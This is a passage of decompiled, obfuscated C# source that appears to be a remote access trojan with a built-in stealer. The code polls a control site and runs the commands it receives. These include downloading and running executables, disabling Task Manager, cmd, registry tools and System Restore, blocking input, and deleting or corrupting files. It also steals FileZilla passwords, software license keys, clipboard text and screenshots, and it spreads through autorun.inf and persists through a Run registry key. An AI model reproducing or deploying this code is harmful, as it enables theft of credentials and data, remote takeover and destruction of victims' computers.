	private static extern bool zapwlohnuglfwowfcntg(IntPtr szcsickannvgezuepg);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr deudaowgvkpbchse(IntPtr szcsickannvgezuepg);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHEmptyRecycleBinA(int cfoipfswufygzjmfwd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszRootPath, int ordyhwxhdtwcdauxprkd);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int deudaowgvkpbchsev();

	private void ispraznismece()
	{
		int cfoipfswufygzjmfwd = ((Control)this).get_Handle().ToInt32();
		string pszRootPath = null;
		SHEmptyRecycleBinA(cfoipfswufygzjmfwd, ref pszRootPath, 5);
		deudaowgvkpbchsev();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int juuptmfysmofterwffj, int uParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam, int fuWinIni);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SendMessageA", ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA_1(int cfoipfswufygzjmfwd, int wMsgsg, int wParam, int ohpnfugvnbpttlm);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int BlockInput(int fegvnpxjnapxbw);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string ohjrzxiyxzo, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, long uReturnLength, long szcsickannvgezuepgCallback);

	public object lvlarrjcoob()
	{
		object result = default(object);
		try
		{
			WebClient webClient = new WebClient();
			NewLateBinding.LateCall((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(site, (object)"index.php?action=delete") }, (string[])null, (Type[])null, (bool[])null, true);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CentralProcessor\\0", "ProcessorNameString", (object)null));
		try
		{
			WebClient webClient = new WebClient();
			string text2 = default(string);
			NewLateBinding.LateCall((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(site, (object)("users.php?action=delete&data=" + Environment.UserName)), (object)"|"), (object)((ServerComputer)MyProject.Computer).get_Info().get_OSFullName()), (object)"|"), (object)utnaroyjti), (object)"|"), (object)RegionInfo.CurrentRegion.DisplayName), (object)"|"), (object)(text + "|")), (object)text2) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void usb()
	{
		try
		{
			string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			for (int i = 0; i < array.Length; i = checked(i + 1))
			{
				try
				{
					File.Copy(Application.get_ExecutablePath(), programFiles + "black.scr");
					StreamWriter streamWriter = new StreamWriter(programFiles + "\\autorun.inf");
					streamWriter.WriteLine("[autorun]");
					streamWriter.WriteLine("open=" + programFiles + "black.scr");
					streamWriter.WriteLine("shellexecute=" + programFiles, 1);
					streamWriter.Close();
					File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
					File.SetAttributes(programFiles + "black.scr", FileAttributes.Hidden);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void asdasdasd(string skehetfodprvsfebtstu, string qewqweqwe)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
			RegistryKey registryKey2 = registryKey;
			registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey2.SetValue(skehetfodprvsfebtstu, qewqweqwe);
			registryKey2 = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public object jitztnwhrvgpsbomvsk()
	{
		//IL_106b: Unknown result type (might be due to invalid IL or missing references)
		//IL_108a: Unknown result type (might be due to invalid IL or missing references)
		//IL_10a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_10c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1580: Unknown result type (might be due to invalid IL or missing references)
		//IL_1587: Expected O, but got Unknown
		//IL_15b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_1615: Unknown result type (might be due to invalid IL or missing references)
		//IL_161c: Expected O, but got Unknown
		checked
		{
			object result = default(object);
			try
			{
				string text = Conversions.ToString(NewLateBinding.LateGet((object)kaipkprjtlkmz, (Type)null, "DownloadString", new object[1] { Operators.AddObject(site, (object)"index.php?action=read") }, (string[])null, (Type[])null, (bool[])null));
				lvlarrjcoob();
				if (Operators.CompareString(text.ToString(), "", false) != 0)
				{
					string[] array = Strings.Split(text.ToString(), "|", -1, (CompareMethod)0);
					if ((Operators.CompareString(array[0], Environment.UserName, false) == 0) | (Operators.CompareString(array[0], "ALL", false) == 0))
					{
						if (Operators.CompareString(array[1], "openprogram", false) == 0)
						{
							Interaction.Shell(array[2], (AppWinStyle)1, false, -1);
						}
						if (Operators.CompareString(array[1], "opencdrom", false) == 0)
						{
							string ohjrzxiyxzo = "Set CDAudio Door Open Wait";
							string lpstrReturnString = Conversions.ToString(0L);
							mciSendStringA(ref ohjrzxiyxzo, ref lpstrReturnString, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string ohjrzxiyxzo = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref ohjrzxiyxzo, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "enabletaskmanager", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"0", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "disabletaskmanager", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "enablecmd", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"0", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "disablecmd", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "enableregistry", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"0", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "disableregistry", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"1", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "enablesystemrestore", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"0", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "disablesystemrestore", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "shutdown", false) == 0)
						{
							Interaction.Shell("shutdown -s", (AppWinStyle)2, false, -1);
						}
						if (Operators.CompareString(array[1], "restart", false) == 0)
						{
							Interaction.Shell("shutdown -r", (AppWinStyle)2, false, -1);
						}
						if (Operators.CompareString(array[1], "standby", false) == 0)
						{
							Interaction.Shell("shutdown -l", (AppWinStyle)2, false, -1);
						}
						if (Operators.CompareString(array[1], "hibernation", false) == 0)
						{
							Interaction.Shell("shutdown -h", (AppWinStyle)2, false, -1);
						}
						if (Operators.CompareString(array[1], "monitoron", false) == 0)
						{
							SendMessageA_1(((Control)this).get_Handle().ToInt32(), 274, 61808, -1);
						}
						if (Operators.CompareString(array[1], "monitoroff", false) == 0)
						{
							SendMessageA_1(((Control)this).get_Handle().ToInt32(), 274, 61808, 2);
						}
						if (Operators.CompareString(array[1], "keymouon", false) == 0)
						{
							BlockInput(0);
						}
						if (Operators.CompareString(array[1], "keymouoff", false) == 0)
						{
							BlockInput(1);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string ohjrzxiyxzo = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref ohjrzxiyxzo, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string ohjrzxiyxzo = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref ohjrzxiyxzo, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string ohjrzxiyxzo = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref ohjrzxiyxzo, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string ohjrzxiyxzo = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref ohjrzxiyxzo, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string ohjrzxiyxzo = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref ohjrzxiyxzo, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "closecdrom", false) == 0)
						{
							string lpstrReturnString = "Set CDAudio Door Closed Wait";
							string ohjrzxiyxzo = Conversions.ToString(0L);
							mciSendStringA(ref lpstrReturnString, ref ohjrzxiyxzo, 0L, 0L);
						}
						if (Operators.CompareString(array[1], "blocksite", false) == 0)
						{
							StreamWriter streamWriter = new StreamWriter(Interaction.Environ("windir") + "\\System32\\drivers\\etc\\hosts");
							streamWriter.WriteLine("\r\n127.0.0.1 " + array[2]);
							streamWriter.Close();
						}
						if (Operators.CompareString(array[1], "deletefile", false) == 0)
						{
							try
							{
								FileInfo fileInfo = new FileInfo(array[2]);
								fileInfo.Delete();
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(array[1], "closeprocess", false) == 0)
						{
							try
							{
								Process[] processesByName = Process.GetProcessesByName(array[2]);
								foreach (Process process in processesByName)
								{
									process.Kill();
								}
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(array[1], "setclipboard", false) == 0)
						{
							Clipboard.SetDataObject((object)array[2], true);
						}
						if (Operators.CompareString(array[1], "mouseup", false) == 0)
						{
							Point position = new Point(0, 0);
							Cursor.set_Position(position);
						}
						if (Operators.CompareString(array[1], "setiehome", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main", "Start Page", (object)array[2]);
						}
						if (Operators.CompareString(array[1], "setiehome", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[2], array[3]);
						}
						if (Operators.CompareString(array[1], "startwrite", false) == 0)
						{
							urjyxhgingmvxauy = array[2];
							draw.set_Enabled(true);
						}
						if (Operators.CompareString(array[1], "stopwrite", false) == 0)
						{
							draw.set_Enabled(false);
						}
						if (Operators.CompareString(array[1], "lockdesktop", false) == 0)
						{
							cjwxwjrrgiizwhymu = (long)wnonambxwaa("Progman", null);
							rzyrilscfyoelcs((int)cjwxwjrrgiizwhymu, 0);
						}
						if (Operators.CompareString(array[1], "desktopunlock", false) == 0)
						{
							cjwxwjrrgiizwhymu = (long)wnonambxwaa("Progman", null);
							rzyrilscfyoelcs((int)cjwxwjrrgiizwhymu, 1);
						}
						if (Operators.CompareString(array[1], "showclock", false) == 0)
						{
							cjwxwjrrgi = (long)wnonambxwaa("shell_traywnd", null);
							int szcsickannvgezuepg = (int)cjwxwjrrgi;
							string lpstrReturnString = "TrayNotifyWnd";
							string ohjrzxiyxzo = null;
							cjwxwjrrgii = FindWindowExA(szcsickannvgezuepg, 0, ref lpstrReturnString, ref ohjrzxiyxzo);
							int szcsickannvgezuepg2 = (int)cjwxwjrrgii;
							lpstrReturnString = "TrayClockWClass";
							ohjrzxiyxzo = null;
							cjwxwjrrgiizwhymuwnadv = FindWindowExA(szcsickannvgezuepg2, 0, ref lpstrReturnString, ref ohjrzxiyxzo);
							nilofodmuirt((int)cjwxwjrrgiizwhymuwnadv, 1);
						}
						if (Operators.CompareString(array[1], "hideclock", false) == 0)
						{
							cjwxwjrrgi = (long)wnonambxwaa("shell_traywnd", null);
							int szcsickannvgezuepg3 = (int)cjwxwjrrgi;
							string lpstrReturnString = "TrayNotifyWnd";
							string ohjrzxiyxzo = null;
							cjwxwjrrgii = FindWindowExA(szcsickannvgezuepg3, 0, ref lpstrReturnString, ref ohjrzxiyxzo);
							int szcsickannvgezuepg4 = (int)cjwxwjrrgii;
							lpstrReturnString = "trayclockwclass";
							ohjrzxiyxzo = null;
							cjwxwjrrgiizwhymuwnadv = FindWindowExA(szcsickannvgezuepg4, 0, ref lpstrReturnString, ref ohjrzxiyxzo);
							nilofodmuirt((int)cjwxwjrrgiizwhymuwnadv, 0);
						}
						if (Operators.CompareString(array[1], "shownotify", false) == 0)
						{
							cjwxwjrrgi = (long)wnonambxwaa("shell_traywnd", null);
							int szcsickannvgezuepg5 = (int)cjwxwjrrgi;
							string lpstrReturnString = "TrayNotifyWnd";
							string ohjrzxiyxzo = null;
							cjwxwjrrgii = FindWindowExA(szcsickannvgezuepg5, 0, ref lpstrReturnString, ref ohjrzxiyxzo);
							nilofodmuirt((int)cjwxwjrrgii, 1);
						}
						if (Operators.CompareString(array[1], "hidenotify", false) == 0)
						{
							cjwxwjrrgi = (long)wnonambxwaa("shell_traywnd", null);
							int szcsickannvgezuepg6 = (int)cjwxwjrrgi;
							string lpstrReturnString = "TrayNotifyWnd";
							string ohjrzxiyxzo = null;
							cjwxwjrrgii = FindWindowExA(szcsickannvgezuepg6, 0, ref lpstrReturnString, ref ohjrzxiyxzo);
							nilofodmuirt((int)cjwxwjrrgii, 0);
						}
						if (Operators.CompareString(array[1], "emptyrecbin", false) == 0)
						{
							ispraznismece();
						}
						if (Operators.CompareString(array[1], "openwebsite", false) == 0)
						{
							Process.Start(array[2]);
						}
						if (Operators.CompareString(array[1], "closeprogramthis", false) == 0)
						{
							string text2 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CentralProcessor\\0", "ProcessorNameString", (object)null));
							try
							{
								WebClient webClient = new WebClient();
								string text3 = default(string);
								NewLateBinding.LateCall((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(site, (object)("users.php?action=delete&data=" + Environment.UserName)), (object)"|"), (object)((ServerComputer)MyProject.Computer).get_Info().get_OSFullName()), (object)"|"), (object)utnaroyjti), (object)"|"), (object)RegionInfo.CurrentRegion.DisplayName), (object)"|"), (object)(text2 + "|")), (object)text3) }, (string[])null, (Type[])null, (bool[])null, true);
								ProjectData.EndApp();
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							ProjectData.EndApp();
						}
						if (Operators.CompareString(array[1], "focusdesktop", false) == 0)
						{
							keybd_event(91, 0, 0, 0);
							keybd_event(77, 0, 0, 0);
							keybd_event(91, 0, 2, 0);
						}
						if (Operators.CompareString(array[1], "mutesound", false) == 0)
						{
							rzyrilscfyoelcslob(((Control)this).get_Handle(), 793, ((Control)this).get_Handle(), (IntPtr)524288);
						}
						if (Operators.CompareString(array[1], "suspendprocess", false) == 0)
						{
							try
							{
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(array[1], "hidetaskbar", false) == 0)
						{
							lvfbijvnjktweww(byvdfeboojkaiistklhe, 0, 0, 0, 0, 0, 128);
						}
						if (Operators.CompareString(array[1], "showtaskbar", false) == 0)
						{
							lvfbijvnjktweww(byvdfeboojkaiistklhe, 0, 0, 0, 0, 0, 64);
						}
						if (Operators.CompareString(array[1], "changenick", false) == 0)
						{
							mynick = array[2];
						}
						IntPtr cfoipfswufygzjmfwd = wnonambxwaa("ProgMan", null);
						cfoipfswufygzjmfwd = ifuxfmgxxxvnrdc(cfoipfswufygzjmfwd, 5u);
						if (Operators.CompareString(array[1], "showicons", false) == 0)
						{
							nilofodmuirt(cfoipfswufygzjmfwd, 4);
						}
						if (Operators.CompareString(array[1], "hideicons", false) == 0)
						{
							nilofodmuirt(cfoipfswufygzjmfwd, 0);
						}
						if (Operators.CompareString(array[1], "changeprocesstitle", false) == 0)
						{
							Process[] processesByName2 = Process.GetProcessesByName("notepad.exe");
							Process[] array2 = processesByName2;
							int num = default(int);
							foreach (Process process2 in array2)
							{
								num = Conversions.ToInteger(process2.ProcessName);
							}
							int szcsickannvgezuepg7 = num;
							string lpstrReturnString = "HAHAHA";
							SetWindowTextA(szcsickannvgezuepg7, ref lpstrReturnString);
						}
						if (Operators.CompareString(array[1], "blockusbwrite", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies", "WriteProtect", (object)"00000001", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "unblockusbwrite", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies", "WriteProtect", (object)"00000000", RegistryValueKind.DWord);
						}
						string path = "C:\\Program Files\\Steam\\ClientRegistry.blob";
						if (File.Exists(path))
						{
							File.Delete(path);
						}
						if (Operators.CompareString(array[1], "settime", false) == 0)
						{
							try
							{
								DateAndTime.set_TimeOfDay(Conversions.ToDate(array[2] + ":" + array[3] + ":" + array[4]));
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
						}
						if (Operators.CompareString(array[1], "getclipboard", false) == 0)
						{
							WebClient webClient2 = new WebClient();
							NewLateBinding.LateCall((object)webClient2, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)Clipboard.GetText()) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "getfilezilla", false) == 0)
						{
							rtb1.LoadFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml", (RichTextBoxStreamType)1);
							RichTextBox val = rtb1;
							val.set_Text(val.get_Text() + "FileZilla Stealer by -Black Hacker-\r\n------------------------------------\r\n");
							string[] lines = ((TextBoxBase)rtb1).get_Lines();
							foreach (string text4 in lines)
							{
								if (text4.Contains("<Host>"))
								{
									val = rtb2;
									val.set_Text(val.get_Text() + "Host: " + text4.Replace("<Host>", "").Replace("</Host>", "").Replace("            ", ""));
								}
								if (text4.Contains("<Port>"))
								{
									val = rtb2;
									val.set_Text(val.get_Text() + ":" + text4.Replace("<Port>", "").Replace("</Port>", "").Replace("            ", "") + "\r\n");
								}
								if (text4.Contains("<User>"))
								{
									val = rtb2;
									val.set_Text(val.get_Text() + "Korisnik:: " + text4.Replace("<User>", "").Replace("</User>", "").Replace("            ", ""));
								}
								if (text4.Contains("<Pass>"))
								{
									val = rtb2;
									val.set_Text(val.get_Text() + " Lozinka: " + text4.Replace("<Pass>", "").Replace("</Pass>", "").Replace("            ", "") + "\r\n------------------------------------\r\n");
								}
							}
							WebClient webClient3 = new WebClient();
							NewLateBinding.LateCall((object)webClient3, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)rtb2.get_Text()) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "printdocument", false) == 0)
						{
							Random random = new Random();
							string text5 = Interaction.Environ("tmp") + "\\" + Conversions.ToString(random.Next()) + ".txt";
							StreamWriter streamWriter2 = new StreamWriter(text5);
							streamWriter2.Write(array[2]);
							streamWriter2.Close();
							Interaction.Shell("notepad /p " + text5, (AppWinStyle)2, false, -1);
						}
						if (Operators.CompareString(array[1], "lockclipboard", false) == 0)
						{
							clipb.set_Enabled(true);
						}
						if (Operators.CompareString(array[1], "clipboardoff", false) == 0)
						{
							clipb.set_Enabled(false);
						}
						if (Operators.CompareString(array[1], "funnycapslockon", false) == 0)
						{
							CAPS.set_Enabled(true);
						}
						if (Operators.CompareString(array[1], "funnycapslockoff", false) == 0)
						{
							CAPS.set_Enabled(false);
						}
						if (Operators.CompareString(array[1], "swapmouse1", false) == 0)
						{
							SwapMouseButton(0L);
						}
						if (Operators.CompareString(array[1], "swapmouse2", false) == 0)
						{
							SwapMouseButton(256L);
						}
						if (Operators.CompareString(array[1], "fakemessage", false) == 0)
						{
							if (Operators.CompareString(array[3], "1", false) == 0)
							{
								Interaction.MsgBox((object)array[2], (MsgBoxStyle)64, (object)array[4]);
							}
							if (Operators.CompareString(array[3], "2", false) == 0)
							{
								Interaction.MsgBox((object)array[2], (MsgBoxStyle)48, (object)array[4]);
							}
							if (Operators.CompareString(array[3], "3", false) == 0)
							{
								Interaction.MsgBox((object)array[2], (MsgBoxStyle)32, (object)array[4]);
							}
							if (Operators.CompareString(array[3], "4", false) == 0)
							{
								Interaction.MsgBox((object)array[2], (MsgBoxStyle)16, (object)array[4]);
							}
						}
						if (Operators.CompareString(array[1], "saytext", false) == 0)
						{
							object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("sapi.spvoice", ""));
							object[] array3 = new object[1];
							object[] array4 = array3;
							string[] array5 = array;
							string[] array6 = array5;
							int num2 = 2;
							array4[0] = array6[2];
							object[] array7 = array3;
							object[] array8 = array7;
							bool[] array9 = new bool[1] { true };
							NewLateBinding.LateCall(objectValue, (Type)null, "Speak", array8, (string[])null, (Type[])null, array9, true);
							if (array9[0])
							{
								array5[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
							}
						}
						if (Operators.CompareString(array[1], "disableshowhiden", false) == 0)
						{
							string text6 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
							((ServerComputer)MyProject.Computer).get_Registry().SetValue(text6, "Hidden", (object)"0", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "enableshowhiden", false) == 0)
						{
							string text7 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
							((ServerComputer)MyProject.Computer).get_Registry().SetValue(text7, "Hidden", (object)"1", RegistryValueKind.DWord);
						}
						if (Operators.CompareString(array[1], "getsampserverdata", false) == 0)
						{
							string text8 = "";
							Process[] processesByName3 = Process.GetProcessesByName("samp-server");
							foreach (Process process3 in processesByName3)
							{
								string fileName = process3.MainModule!.FileName;
								fileName = fileName.ToString().Replace("samp-server.exe", string.Empty);
								StreamReader streamReader = new StreamReader(fileName + "server.cfg");
								string text9 = streamReader.ReadToEnd();
								streamReader.Close();
								text8 = text9;
							}
							WebClient webClient4 = new WebClient();
							NewLateBinding.LateCall((object)webClient4, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)text8) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "getwindowswallpaperpath", false) == 0)
						{
							RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: false);
							string text10 = registryKey.GetValue("WallPaper")!.ToString();
							registryKey.Close();
							WebClient webClient5 = new WebClient();
							NewLateBinding.LateCall((object)webClient5, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)text10) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "down2load", false) == 0)
						{
							fcwhxsigtfsoozzirrlv(Conversions.ToString(Operators.ConcatenateObject(site, (object)"files/transfer/upload.php")), array[2]);
						}
						if (Operators.CompareString(array[1], "d2fi2runit", false) == 0)
						{
							Random random2 = new Random();
							string text11 = Conversions.ToString(random2.Next());
							((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[2], Interaction.Environ("tmp") + "/" + text11 + ".exe");
							if (Operators.CompareString(array[3], "1", false) == 0)
							{
								if (Operators.CompareString(array[4], "1", false) == 0)
								{
									Interaction.Shell(Interaction.Environ("tmp") + "/" + text11 + ".exe", (AppWinStyle)0, false, -1);
								}
								else
								{
									Interaction.Shell(Interaction.Environ("tmp") + "/" + text11 + ".exe", (AppWinStyle)1, false, -1);
								}
							}
							fcwhxsigtfsoozzirrlv(Conversions.ToString(Operators.ConcatenateObject(site, (object)"files/transfer/upload.php")), array[2]);
						}
						if (Operators.CompareString(array[1], "setstartbuttontext", false) == 0)
						{
							SetStartCaption(array[2]);
						}
						if (Operators.CompareString(array[1], "coruptfile", false) == 0)
						{
							Corrupt(array[2], "lolHAHAHAHHAHAHAHAHAhackedbygpyouaredoomd!");
						}
						if (Operators.CompareString(array[1], "defaultbrowser", false) == 0)
						{
							WebClient webClient6 = new WebClient();
							NewLateBinding.LateCall((object)webClient6, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)nfgjmgnlogxoap()) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "getcamstasialicence", false) == 0)
						{
							string text12 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\6.0", "RegisteredTo", (object)null));
							string text13 = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\6.0", "RegistrationKey", (object)null));
							string text14 = "User: " + text12 + "\r\nSerial: " + text13;
							WebClient webClient7 = new WebClient();
							NewLateBinding.LateCall((object)webClient7, (Type)null, "DownloadString", new object[1] { Operators.AddObject(Operators.AddObject(site, (object)"data.php?action=write&data="), (object)text14) }, (string[])null, (Type[])null, (bool[])null, true);
						}
						if (Operators.CompareString(array[1], "postscreenshot", false) == 0)
						{
							Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
							Bitmap val2 = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
							Graphics val3 = Graphics.FromImage((Image)(object)val2);
							val3.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
							new PictureBox();
							((Image)val2).Save(Interaction.Environ("tmp") + "/image.jpg");
							fcwhxsigtfsoozzirrlv(Conversions.ToString(Operators.ConcatenateObject(site, (object)"files/image/desktop/upload.php")), Interaction.Environ("tmp") + "/image.jpg");
						}
						if (Operators.CompareString(array[1], "instaledsoft", false) == 0)
						{
							RichTextBox val4 = new RichTextBox();
							val4.set_Text(idpumerztvcjsmhe());
							WebClient webClient8 = new WebClient();
